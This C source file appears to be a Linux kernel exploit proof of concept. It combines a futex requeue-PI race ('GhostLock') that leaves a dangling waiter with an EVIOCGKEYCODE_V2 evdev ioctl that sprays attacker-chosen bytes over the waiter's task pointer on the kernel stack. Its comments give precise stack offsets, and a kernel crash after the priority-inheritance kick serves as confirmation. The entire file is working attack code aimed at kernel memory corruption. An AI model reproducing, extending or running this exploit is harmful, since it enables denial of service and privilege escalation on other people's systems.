/**
 * ghostlock_evdev_cfu.c — GhostLock + EVIOCGKEYCODE_V2 stack CFU
 *
 * CORRECTED layout:
 *   waiter in do_futex at x29-0xc8 → task @ stack_top-0x168
 *   evdev_ioctl_handler: CFU 0x28 @ SP+8, nest 0xD0 → [0x168,0x190)
 *   First 8 bytes of keymap_entry cover waiter->task.
 *
 * KERNEL CRASH with pattern 0x4141... after PI kick ⇒ cover.
 */
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/input.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef EVIOCGKEYCODE_V2
#define EVIOCGKEYCODE_V2 _IOC(_IOC_READ | _IOC_WRITE, 'E', 0x04, 0x28)
#endif

static uint32_t f_wait __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain __attribute__((aligned(4096)));
static volatile int ready, owner_ok, done;
static int g_evfd = -1;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2,
                  uint32_t v3) {
  return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static int open_evdev(void) {
  const char *paths[] = {"/dev/input/event0", "/dev/input/event1",
                         "/dev/input/event2", "/dev/input/event6", NULL};
  for (int i = 0; paths[i]; i++) {
    int fd = open(paths[i], O_RDWR);
    if (fd < 0)
      fd = open(paths[i], O_RDONLY);
    if (fd >= 0) {
      printf("[pre] opened %s fd=%d\n", paths[i], fd);
      return fd;
    }
  }
  return -1;
}

static void *waiter(void *a) {
  (void)a;
  g_evfd = open_evdev();
  if (g_evfd < 0) {
    printf("evdev open failed\n");
    done = 1;
    return 0;
  }

  futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
  ready = 1;
  while (!owner_ok)
    usleep(1000);

  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  ts.tv_sec += 8;
  long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
  printf("[waiter] WAIT_REQUEUE_PI ret=%ld errno=%d\n", r, errno);

  /* 40-byte CFU; byte 0..7 = predicted task */
  uint64_t buf[5];
  buf[0] = 0x4141414141414141ULL;
  buf[1] = 0x4242424242424242ULL;
  buf[2] = 0x4343434343434343ULL;
  buf[3] = 0x4444444444444444ULL;
  buf[4] = 0x4545454545454545ULL;

  printf("[evdev] FIRING EVIOCGKEYCODE_V2 crash pattern (task@+0)\n");
  errno = 0;
  r = ioctl(g_evfd, EVIOCGKEYCODE_V2, buf);
  printf("[evdev] ioctl ret=%ld errno=%d %s\n", r, errno,
         r < 0 ? strerror(errno) : "OK");

  /* kick PI / priority paths */
  struct {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime, sched_deadline, sched_period;
    uint32_t sched_util_min, sched_util_max;
  } attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_nice = 5;
  errno = 0;
  r = syscall(274, 0, &attr, 0);
  printf("[pi] sched_setattr nice=5 ret=%ld errno=%d\n", r, errno);
  attr.sched_nice = 0;
  syscall(274, 0, &attr, 0);

  close(g_evfd);
  futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
  done = 1;
  return 0;
}

static void *owner(void *a) {
  (void)a;
  futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
  owner_ok = 1;
  while (!ready)
    usleep(1000);
  usleep(400000);
  futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
  while (!done)
    sleep(1);
  return 0;
}

int main(void) {
  printf("ghostlock_evdev_cfu — task@-0x168 vs EVIOCG 40B CFU\n");
  printf("CRASH => cover; survive => gap or residual not live\n\n");
  f_wait = f_pi_target = f_pi_chain = 0;

  pthread_t wt, ot;
  pthread_create(&wt, 0, waiter, 0);
  usleep(200000);
  pthread_create(&ot, 0, owner, 0);
  usleep(300000);

  printf("[trigger] CMP_REQUEUE_PI...\n");
  for (int i = 0; i < 100; i++) {
    long r =
        futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    if (r >= 0) {
      printf("[trigger] GhostLock ret=%ld\n", r);
      break;
    }
    usleep(1000);
  }

  while (!done)
    sleep(1);
  pthread_join(wt, 0);
  pthread_join(ot, 0);
  printf("\n=== KERNEL SURVIVED ===\n");
  return 0;
}
